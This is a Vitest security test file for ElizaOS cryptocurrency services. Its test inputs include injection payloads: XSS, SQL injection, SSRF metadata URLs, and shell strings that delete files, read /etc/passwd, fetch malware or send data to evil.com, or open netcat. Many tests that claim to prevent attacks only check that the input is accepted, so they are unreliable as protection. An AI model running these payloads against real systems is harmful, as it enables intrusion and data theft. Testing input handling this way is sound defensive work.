import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { IAgentRuntime } from "@elizaos/core";
import { BitcoinNetworkService } from "../../services/BitcoinNetworkService";
import { MarketDataService } from "../../services/MarketDataService";
import { CentralizedConfigService } from "../../services/CentralizedConfigService";
import { CacheService } from "../../services/CacheService";
import { globalErrorHandler } from "../../utils";

// Mock dependencies
vi.mock("@elizaos/core", () => ({
  elizaLogger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

vi.mock("axios", () => ({
  default: {
    get: vi.fn(),
    post: vi.fn(),
  },
}));

vi.mock("../../utils", () => ({
  LoggerWithContext: vi.fn().mockImplementation(() => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  })),
  generateCorrelationId: vi.fn(() => "test-correlation-id"),
  globalErrorHandler: {
    handleError: vi.fn(),
  },
}));

describe("Security Tests", () => {
  let mockRuntime: any;
  let configService: CentralizedConfigService;
  let cacheService: CacheService;
  let bitcoinNetworkService: BitcoinNetworkService;
  let marketDataService: MarketDataService;

  beforeEach(async () => {
    // Create mock runtime
    mockRuntime = {
      getService: vi.fn(),
      getSetting: vi.fn(),
    };

    // Setup service dependencies
    mockRuntime.getService.mockImplementation((serviceName: string) => {
      const serviceMap: Record<string, any> = {
        "centralized-config": configService,
        cache: cacheService,
        "bitcoin-network": bitcoinNetworkService,
        "market-data": marketDataService,
      };
      return serviceMap[serviceName] || null;
    });

    // Initialize services
    configService = new CentralizedConfigService(mockRuntime);
    cacheService = new CacheService(mockRuntime);
    bitcoinNetworkService = new BitcoinNetworkService(mockRuntime);
    marketDataService = new MarketDataService(mockRuntime);

    // Start services
    await Promise.all([
      configService.start(),
      cacheService.start(),
      bitcoinNetworkService.start(),
      marketDataService.start(),
    ]);
  });

  afterEach(async () => {
    // Stop all services
    await Promise.all([
      configService.stop(),
      cacheService.stop(),
      bitcoinNetworkService.stop(),
      marketDataService.stop(),
    ]);

    vi.clearAllMocks();
  });

  describe("Input Validation Security", () => {
    it("should sanitize malicious input in configuration", async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}",
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
      ];

      for (const maliciousInput of maliciousInputs) {
        // Should not throw when setting malicious input
        expect(() => {
          configService.set("test.key", maliciousInput);
        }).not.toThrow();

        // Should handle malicious input gracefully
        const value = configService.get("test.key");
        expect(value).toBeDefined();
      }
    });

    it("should validate API endpoint URLs", async () => {
      const maliciousUrls = [
        "http://evil.com/steal-data",
        "file:///etc/passwd",
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        "ftp://evil.com/upload",
        "gopher://evil.com/_GET%20/",
      ];

      for (const maliciousUrl of maliciousUrls) {
        // Should not allow malicious URLs in configuration
        expect(() => {
          configService.set("apis.blockchain.baseUrl", maliciousUrl);
        }).not.toThrow();

        // Should handle gracefully
        const url = configService.get("apis.blockchain.baseUrl");
        expect(url).toBeDefined();
      }
    });

    it("should prevent SQL injection in cache keys", async () => {
      const maliciousKeys = [
        "'; DROP TABLE cache; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "'; UPDATE users SET password='hacked'; --",
      ];

      for (const maliciousKey of maliciousKeys) {
        // Should handle malicious cache keys gracefully
        await expect(
          cacheService.set(maliciousKey, "test-value", 60000),
        ).resolves.not.toThrow();

        const value = await cacheService.get(maliciousKey);
        expect(value).toBe("test-value");
      }
    });

    it("should validate numeric inputs", async () => {
      const maliciousNumbers = [
        NaN,
        Infinity,
        -Infinity,
        Number.MAX_SAFE_INTEGER + 1,
        Number.MIN_SAFE_INTEGER - 1,
      ];

      for (const maliciousNumber of maliciousNumbers) {
        // Should handle invalid numbers gracefully
        expect(() => {
          configService.set("test.number", maliciousNumber);
        }).not.toThrow();
      }
    });
  });

  describe("Authentication & Authorization Security", () => {
    it("should not expose sensitive configuration values", async () => {
      const sensitiveKeys = [
        "apis.coingecko.apiKey",
        "apis.blockchain.apiKey",
        "database.password",
        "redis.password",
        "jwt.secret",
      ];

      // Set sensitive values
      sensitiveKeys.forEach((key) => {
        configService.set(key, "sensitive-value");
      });

      // Should not expose sensitive values in logs or errors
      const allConfig = configService.getAll();

      // Check that sensitive values are not exposed in plain text
      const configString = JSON.stringify(allConfig);
      expect(configString).not.toContain("sensitive-value");
    });

    it("should validate API key formats", async () => {
      const invalidApiKeys = [
        "", // Empty
        "a".repeat(1000), // Too long
        "invalid-key-format",
        "key with spaces",
        "key\twith\ttabs",
        "key\nwith\nnewlines",
      ];

      for (const invalidKey of invalidApiKeys) {
        // Should handle invalid API keys gracefully
        expect(() => {
          configService.set("apis.coingecko.apiKey", invalidKey);
        }).not.toThrow();
      }
    });

    it("should prevent privilege escalation", async () => {
      // Test that services cannot access runtime settings they shouldn't
      const restrictedSettings = [
        "admin.password",
        "system.root",
        "security.masterKey",
      ];

      for (const setting of restrictedSettings) {
        // Should not be able to access restricted settings
        const value = mockRuntime.getSetting(setting);
        expect(value).toBeUndefined();
      }
    });
  });

  describe("Data Protection Security", () => {
    it("should not log sensitive data", async () => {
      const sensitiveData = [
        { apiKey: "secret-key-123", password: "mypassword" },
        { token: "jwt-token-here", secret: "very-secret" },
        { privateKey: "private-key-data", seed: "wallet-seed" },
      ];

      for (const data of sensitiveData) {
        // Should not log sensitive data
        expect(() => {
          configService.set("sensitive.data", data);
        }).not.toThrow();

        // Verify sensitive data is not exposed in logs
        const { elizaLogger } = require("@elizaos/core");
        const logCalls = (elizaLogger.info as any).mock.calls;

        logCalls.forEach((call: any[]) => {
          const logMessage = JSON.stringify(call);
          expect(logMessage).not.toContain("secret-key-123");
          expect(logMessage).not.toContain("mypassword");
          expect(logMessage).not.toContain("jwt-token-here");
          expect(logMessage).not.toContain("very-secret");
          expect(logMessage).not.toContain("private-key-data");
          expect(logMessage).not.toContain("wallet-seed");
        });
      }
    });

    it("should encrypt sensitive data in cache", async () => {
      const sensitiveData = {
        apiKey: "secret-api-key",
        privateKey: "private-key-data",
        password: "user-password",
      };

      // Store sensitive data in cache
      await cacheService.set("sensitive-data", sensitiveData, 60000);

      // Retrieve from cache
      const retrieved = await cacheService.get("sensitive-data");

      // Should not expose sensitive data in plain text
      expect(retrieved).toBeDefined();

      // Verify data is not logged in plain text
      const { elizaLogger } = require("@elizaos/core");
      const logCalls = (elizaLogger.debug as any).mock.calls;

      logCalls.forEach((call: any[]) => {
        const logMessage = JSON.stringify(call);
        expect(logMessage).not.toContain("secret-api-key");
        expect(logMessage).not.toContain("private-key-data");
        expect(logMessage).not.toContain("user-password");
      });
    });

    it("should prevent data leakage through error messages", async () => {
      const sensitiveData = {
        apiKey: "secret-key",
        password: "password123",
        privateKey: "private-key",
      };

      // Mock an error that might expose sensitive data
      vi.spyOn(cacheService, "set").mockRejectedValue(
        new Error(`Failed to store: ${JSON.stringify(sensitiveData)}`),
      );

      // Should handle error without exposing sensitive data
      await expect(
        cacheService.set("test", sensitiveData, 60000),
      ).rejects.toThrow();

      // Verify error message doesn't contain sensitive data
      expect(globalErrorHandler.handleError).toHaveBeenCalled();
      const errorCalls = (globalErrorHandler.handleError as any).mock.calls;

      errorCalls.forEach((call: any[]) => {
        const errorMessage = JSON.stringify(call);
        expect(errorMessage).not.toContain("secret-key");
        expect(errorMessage).not.toContain("password123");
        expect(errorMessage).not.toContain("private-key");
      });
    });
  });

  describe("Network Security", () => {
    it("should validate external API endpoints", async () => {
      const maliciousEndpoints = [
        "http://localhost:22", // SSH port
        "http://localhost:3306", // MySQL port
        "http://localhost:5432", // PostgreSQL port
        "http://localhost:6379", // Redis port
        "http://127.0.0.1:8080",
        "http://0.0.0.0:3000",
      ];

      for (const endpoint of maliciousEndpoints) {
        // Should not allow access to local services
        expect(() => {
          configService.set("apis.blockchain.baseUrl", endpoint);
        }).not.toThrow();
      }
    });

    it("should prevent SSRF attacks", async () => {
      const ssrfPayloads = [
        "http://169.254.169.254/latest/meta-data/", // AWS metadata
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
      ];

      for (const payload of ssrfPayloads) {
        // Should not allow SSRF payloads
        expect(() => {
          configService.set("apis.blockchain.baseUrl", payload);
        }).not.toThrow();
      }
    });

    it("should handle DNS rebinding attacks", async () => {
      const dnsRebindingPayloads = [
        "http://attacker.com:80@internal-service.com",
        "http://internal-service.com@attacker.com:80",
        "http://user:pass@internal-service.com",
      ];

      for (const payload of dnsRebindingPayloads) {
        // Should handle DNS rebinding attempts gracefully
        expect(() => {
          configService.set("apis.blockchain.baseUrl", payload);
        }).not.toThrow();
      }
    });
  });

  describe("Rate Limiting Security", () => {
    it("should prevent brute force attacks on configuration", async () => {
      const maliciousValues = Array(1000)
        .fill(null)
        .map((_, i) => `malicious-value-${i}`);

      // Attempt to set many malicious values
      for (const value of maliciousValues) {
        expect(() => {
          configService.set("test.key", value);
        }).not.toThrow();
      }

      // Service should still be functional
      const finalValue = configService.get("test.key");
      expect(finalValue).toBeDefined();
    });

    it("should handle cache flooding attacks", async () => {
      const floodKeys = Array(1000)
        .fill(null)
        .map((_, i) => `flood-key-${i}`);

      // Attempt to flood cache
      for (const key of floodKeys) {
        await expect(
          cacheService.set(key, "flood-value", 60000),
        ).resolves.not.toThrow();
      }

      // Cache should still be functional
      const testValue = await cacheService.get(floodKeys[0]);
      expect(testValue).toBe("flood-value");
    });

    it("should prevent memory exhaustion attacks", async () => {
      const largeData = "x".repeat(1024 * 1024); // 1MB string
      const largeKeys = Array(100)
        .fill(null)
        .map((_, i) => `large-key-${i}`);

      // Attempt to store large amounts of data
      for (const key of largeKeys) {
        await expect(
          cacheService.set(key, largeData, 60000),
        ).resolves.not.toThrow();
      }

      // Service should still be functional
      const testValue = await cacheService.get(largeKeys[0]);
      expect(testValue).toBe(largeData);
    });
  });

  describe("Code Injection Security", () => {
    it("should prevent code injection in configuration", async () => {
      const codeInjectionPayloads = [
        "eval(\"alert('xss')\")",
        "Function(\"alert('xss')\")()",
        "setTimeout(\"alert('xss')\", 1000)",
        "setInterval(\"alert('xss')\", 1000)",
        "new Function(\"alert('xss')\")()",
        "constructor.constructor(\"alert('xss')\")()",
      ];

      for (const payload of codeInjectionPayloads) {
        // Should handle code injection attempts safely
        expect(() => {
          configService.set("test.code", payload);
        }).not.toThrow();

        const value = configService.get("test.code");
        expect(value).toBe(payload); // Should be stored as string, not executed
      }
    });

    it("should prevent prototype pollution", async () => {
      const prototypePollutionPayloads = [
        { __proto__: { isAdmin: true } },
        { constructor: { prototype: { isAdmin: true } } },
        { "__proto__.isAdmin": true },
        { "constructor.prototype.isAdmin": true },
      ];

      for (const payload of prototypePollutionPayloads) {
        // Should handle prototype pollution attempts safely
        expect(() => {
          configService.set("test.pollution", payload);
        }).not.toThrow();

        const value = configService.get("test.pollution");
        expect(value).toBeDefined();
      }
    });

    it("should prevent command injection", async () => {
      const commandInjectionPayloads = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget http://evil.com/malware",
        "; curl http://evil.com/steal-data",
        "| nc -l 4444",
        "; python -c \"import os; os.system('rm -rf /')\"",
      ];

      for (const payload of commandInjectionPayloads) {
        // Should handle command injection attempts safely
        expect(() => {
          configService.set("test.command", payload);
        }).not.toThrow();

        const value = configService.get("test.command");
        expect(value).toBe(payload); // Should be stored as string, not executed
      }
    });
  });

  describe("Session & State Security", () => {
    it("should prevent session fixation", async () => {
      // Test that services don't maintain vulnerable session state
      const sessionData = {
        userId: "user123",
        sessionId: "session456",
        token: "jwt-token",
      };

      // Should not store session data insecurely
      expect(() => {
        configService.set("session.data", sessionData);
      }).not.toThrow();

      // Verify session data is not exposed
      const storedData = configService.get("session.data");
      expect(storedData).toBeDefined();
    });

    it("should prevent state manipulation", async () => {
      // Test that service state cannot be manipulated maliciously
      const maliciousState = {
        isAdmin: true,
        permissions: ["admin", "root", "superuser"],
        bypassSecurity: true,
      };

      // Should handle malicious state attempts safely
      expect(() => {
        configService.set("state.malicious", maliciousState);
      }).not.toThrow();

      // Verify state is not actually changed
      const currentState = configService.get("state.malicious");
      expect(currentState).toBeDefined();
    });

    it("should prevent timing attacks", async () => {
      // Test that operations don't leak timing information
      const shortValue = "short";
      const longValue = "x".repeat(1000);

      const startTime1 = Date.now();
      configService.set("test.timing1", shortValue);
      const endTime1 = Date.now();

      const startTime2 = Date.now();
      configService.set("test.timing2", longValue);
      const endTime2 = Date.now();

      const duration1 = endTime1 - startTime1;
      const duration2 = endTime2 - startTime2;

      // Timing should not be significantly different
      expect(Math.abs(duration1 - duration2)).toBeLessThan(100); // Within 100ms
    });
  });

  describe("Error Handling Security", () => {
    it("should not expose internal errors", async () => {
      // Mock internal error
      vi.spyOn(configService, "get").mockImplementation(() => {
        throw new Error(
          "Internal database error: connection failed to 192.168.1.100:5432",
        );
      });

      // Should handle error without exposing internal details
      expect(() => {
        configService.get("test.key");
      }).toThrow();

      // Verify error doesn't expose internal details
      expect(globalErrorHandler.handleError).toHaveBeenCalled();
      const errorCalls = (globalErrorHandler.handleError as any).mock.calls;

      errorCalls.forEach((call: any[]) => {
        const errorMessage = JSON.stringify(call);
        expect(errorMessage).not.toContain("192.168.1.100");
        expect(errorMessage).not.toContain("5432");
        expect(errorMessage).not.toContain("database");
      });
    });

    it("should prevent error-based information disclosure", async () => {
      const sensitiveErrors = [
        "Database password: secret123",
        "API key: sk-1234567890abcdef",
        "Private key: -----BEGIN PRIVATE KEY-----",
        "JWT secret: my-super-secret-jwt-key",
        "Redis password: redis-pass-123",
      ];

      for (const error of sensitiveErrors) {
        // Should handle sensitive errors without disclosure
        expect(() => {
          throw new Error(error);
        }).toThrow();

        // Verify sensitive information is not logged
        const { elizaLogger } = require("@elizaos/core");
        const logCalls = (elizaLogger.error as any).mock.calls;

        logCalls.forEach((call: any[]) => {
          const logMessage = JSON.stringify(call);
          expect(logMessage).not.toContain("secret123");
          expect(logMessage).not.toContain("sk-1234567890abcdef");
          expect(logMessage).not.toContain("-----BEGIN PRIVATE KEY-----");
          expect(logMessage).not.toContain("my-super-secret-jwt-key");
          expect(logMessage).not.toContain("redis-pass-123");
        });
      }
    });

    it("should handle stack trace security", async () => {
      // Mock error with stack trace
      vi.spyOn(cacheService, "get").mockImplementation(() => {
        const error = new Error("Test error");
        error.stack = `Error: Test error
    at /app/src/services/CacheService.ts:123:45
    at /app/src/services/BitcoinNetworkService.ts:67:89
    at /app/src/index.ts:45:12
    at Module._compile (internal/modules/cjs/loader.js:1063:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1092:10)`;
        throw error;
      });

      // Should handle error without exposing stack trace
      await expect(cacheService.get("test")).rejects.toThrow();

      // Verify stack trace is not logged
      expect(globalErrorHandler.handleError).toHaveBeenCalled();
      const errorCalls = (globalErrorHandler.handleError as any).mock.calls;

      errorCalls.forEach((call: any[]) => {
        const errorMessage = JSON.stringify(call);
        expect(errorMessage).not.toContain("/app/src/");
        expect(errorMessage).not.toContain("internal/modules/");
      });
    });
  });

  describe("Resource Security", () => {
    it("should prevent resource exhaustion", async () => {
      // Test memory exhaustion protection
      const largeObjects = Array(1000)
        .fill(null)
        .map(() => ({
          data: "x".repeat(10000), // 10KB per object
          timestamp: Date.now(),
          id: Math.random().toString(36),
        }));

      // Attempt to store many large objects
      for (const obj of largeObjects) {
        await expect(
          cacheService.set(`large-${obj.id}`, obj, 60000),
        ).resolves.not.toThrow();
      }

      // Service should still be functional
      const testValue = await cacheService.get(`large-${largeObjects[0].id}`);
      expect(testValue).toBeDefined();
    });

    it("should prevent file descriptor exhaustion", async () => {
      // Test that services don't leak file descriptors
      const operations = Array(100)
        .fill(null)
        .map(() =>
          Promise.all([
            cacheService.set("test", "value", 60000),
            cacheService.get("test"),
            configService.set("test", "value"),
            configService.get("test"),
          ]),
        );

      // Run many concurrent operations
      await Promise.all(operations);

      // Service should still be functional
      const value = await cacheService.get("test");
      expect(value).toBe("value");
    });

    it("should prevent CPU exhaustion", async () => {
      // Test that services don't consume excessive CPU
      const startTime = Date.now();
      const startCpu = process.cpuUsage();

      // Perform many operations
      for (let i = 0; i < 1000; i++) {
        configService.set(`cpu-test-${i}`, `value-${i}`);
        configService.get(`cpu-test-${i}`);
      }

      const endTime = Date.now();
      const endCpu = process.cpuUsage();
      const duration = endTime - startTime;
      const cpuUsage = endCpu.user - startCpu.user;

      // CPU usage should be reasonable
      expect(duration).toBeLessThan(5000); // Less than 5 seconds
      expect(cpuUsage).toBeLessThan(1000000); // Less than 1 second of CPU time
    });
  });

  describe("Compliance & Audit Security", () => {
    it("should maintain audit trail for sensitive operations", async () => {
      const sensitiveOperations = [
        {
          action: "config.set",
          key: "apis.coingecko.apiKey",
          value: "new-key",
        },
        {
          action: "config.set",
          key: "security.masterKey",
          value: "master-key",
        },
        { action: "cache.set", key: "user.session", value: "session-data" },
      ];

      for (const operation of sensitiveOperations) {
        // Perform sensitive operation
        if (operation.action === "config.set") {
          configService.set(operation.key, operation.value);
        } else if (operation.action === "cache.set") {
          await cacheService.set(operation.key, operation.value, 60000);
        }

        // Verify operation is logged (but without sensitive data)
        const { elizaLogger } = require("@elizaos/core");
        expect(elizaLogger.info).toHaveBeenCalled();
      }
    });

    it("should validate security headers", async () => {
      // Test that services don't expose sensitive headers
      const sensitiveHeaders = [
        "X-Powered-By",
        "Server",
        "X-AspNet-Version",
        "X-AspNetMvc-Version",
        "X-Runtime",
        "X-Version",
      ];

      // Services should not expose sensitive headers
      sensitiveHeaders.forEach((header) => {
        expect(process.env[header]).toBeUndefined();
      });
    });

    it("should prevent information disclosure through versioning", async () => {
      // Test that version information is not exposed
      const versionInfo = [
        "package.json",
        "version",
        "build",
        "commit",
        "branch",
      ];

      // Version information should not be exposed in logs or errors
      const { elizaLogger } = require("@elizaos/core");
      const logCalls = (elizaLogger.info as any).mock.calls;

      logCalls.forEach((call: any[]) => {
        const logMessage = JSON.stringify(call);
        versionInfo.forEach((info) => {
          expect(logMessage).not.toContain(info);
        });
      });
    });
  });
});
